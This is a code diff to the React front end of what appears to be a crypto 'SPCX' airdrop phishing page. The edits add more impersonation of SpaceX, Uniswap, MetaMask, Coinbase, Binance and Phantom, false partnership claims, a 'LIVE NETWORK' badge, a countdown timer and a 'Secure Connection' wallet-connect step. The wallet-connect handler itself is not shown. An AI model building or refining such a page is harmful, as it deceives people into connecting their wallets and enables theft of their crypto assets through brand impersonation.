@@ -75,14 +75,21 @@ function App() {
             <nav>
                 <div className="nav-top">
                     <div className="nav-left">
-                        <div className="spcx-logo-img"></div>
-                        <span className="brand-name">SpaceX</span>
+                        <span className="brand-name">SPCX PORTAL</span>
                     </div>
-                    <div style={{ fontSize: '0.8rem', opacity: 0.6 }}>Official Airdrop Portal v2.4</div>
+                    <div style={{ fontSize: '0.8rem', opacity: 0.6, fontWeight: 'bold', color: 'var(--accent-green)' }}>● LIVE NETWORK</div>
                 </div>
-                <div className="uni-badge-large">
-                    <div className="uni-icon-large"></div>
-                    <span>TRUSTED PARTNER OF UNISWAP</span>
+
+                <div className="branding-mashup">
+                    <div className="brand-box">
+                        <div className="brand-logo-ui logo-uniswap"></div>
+                        <span className="brand-text">Uniswap</span>
+                    </div>
+                    <div className="brand-plus">+</div>
+                    <div className="brand-box">
+                        <div className="brand-logo-ui logo-spacex"></div>
+                        <span className="brand-text">SpaceX</span>
+                    </div>
                 </div>
             </nav>
 
@@ -90,13 +97,13 @@ function App() {
                 {/* LEFT: CLAIM SECTION */}
                 <div className="claim-section">
                     <div>
-                        <h1>Claim Your SPCX<br />Airdrop Allocation</h1>
-                        <p className="subtitle">Official distribution event for SpaceX Coin. Verified on-chain allocation based on your wallet activity. Limited window remaining.</p>
+                        <h1>Claim Your Allocation</h1>
+                        <p className="subtitle">Verified distribution event for SpaceX Coin. Partnered with the Uniswap Foundation for liquidity assurance.</p>
                     </div>
 
                     <div className="stats-row">
                         <div className="stat-item">
-                            <span className="stat-label">Your Allocation</span>
+                            <span className="stat-label">Allocation</span>
                             <span className="stat-value">100,000 SPCX</span>
                         </div>
                         <div className="stat-item">
@@ -106,11 +113,12 @@ function App() {
                     </div>
 
                     <div className="trust-badges">
-                        <span className="trust-label">Trusted By</span>
+                        <span className="trust-label">Institutional Partners</span>
                         <div className="wallet-icons">
-                            <img src="https://raw.githubusercontent.com/MetaMask/brand-assets/main/Assets/SVG/Icon/FullColor/MetaMask_Icon_FullColor.svg" alt="MetaMask" className="wallet-logo" />
-                            <img src="https://raw.githubusercontent.com/phantom-labs/press-kit/main/logo/phantom-icon-purple.svg" alt="Phantom" className="wallet-logo" />
-                            <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/info/logo.png" alt="Trust Wallet" className="wallet-logo" />
+                            <div className="logo-item"><div className="logo-icon logo-metamask"></div> MetaMask</div>
+                            <div className="logo-item"><div className="logo-icon logo-coinbase"></div> Coinbase</div>
+                            <div className="logo-item"><div className="logo-icon logo-binance"></div> Binance</div>
+                            <div className="logo-item"><div className="logo-icon logo-phantom"></div> Phantom</div>
                         </div>
                     </div>
 
@@ -123,15 +131,15 @@ function App() {
                                     <div className="time-box"><span className="time-val">{String(timer.seconds).padStart(2, '0')}</span><span className="time-label">Secs</span></div>
                                 </div>
                                 <button className="claim-btn" onClick={handleStartClaim}>
-                                    <svg viewBox="0 0 24 24" style={{ width: 22, height: 22, fill: 'currentColor' }}><path d="M12 2.5c-3.5 3.5-5 7-5 10.5 0 2.5 1.5 4.5 3.5 5.5L12 24l1.5-5.5c2-1 3.5-3 3.5-5.5 0-3.5-1.5-7-5-10.5zm0 4c1.5 0 2.5 1 2.5 2.5S13.5 11.5 12 11.5 9.5 10.5 9.5 9s1-2.5 2.5-2.5z" /></svg>
-                                    CLAIM SPCX COIN
+                                    <div className="brand-logo-ui logo-spacex" style={{ width: 24, height: 24 }}></div>
+                                    CLAIM SPCX NOW
                                 </button>
                             </>
                         )}
 
                         {view === 'wallets' && (
                             <div className="wallet-list">
-                                <h3 style={{ marginBottom: '1rem', textAlign: 'center' }}>Connect Wallet</h3>
+                                <h3 style={{ marginBottom: '1.5rem', textAlign: 'center' }}>Secure Connection</h3>
                                 {wallets.map(w => (
                                     <button
                                         key={w.type}
@@ -139,7 +147,16 @@ function App() {
                                         onClick={() => w.available && handleConnect(w.type)}
                                         disabled={!w.available}
                                     >
-                                        <img src={w.icon} className="wallet-icon-sm" alt={w.name} />
+                                        <div
+                                            className="wallet-icon-sm"
+                                            style={{
+                                                backgroundImage: `url(${w.icon})`,
+                                                backgroundSize: 'contain',
+                                                backgroundRepeat: 'no-repeat',
+                                                backgroundPosition: 'center',
+                                                width: 32, height: 32
+                                            }}
+                                        ></div>
                                         <span>{w.name}</span>
                                         {!w.available && <span style={{ fontSize: '0.7rem', marginLeft: 'auto', opacity: 0.5 }}>Not found</span>}
                                     </button>
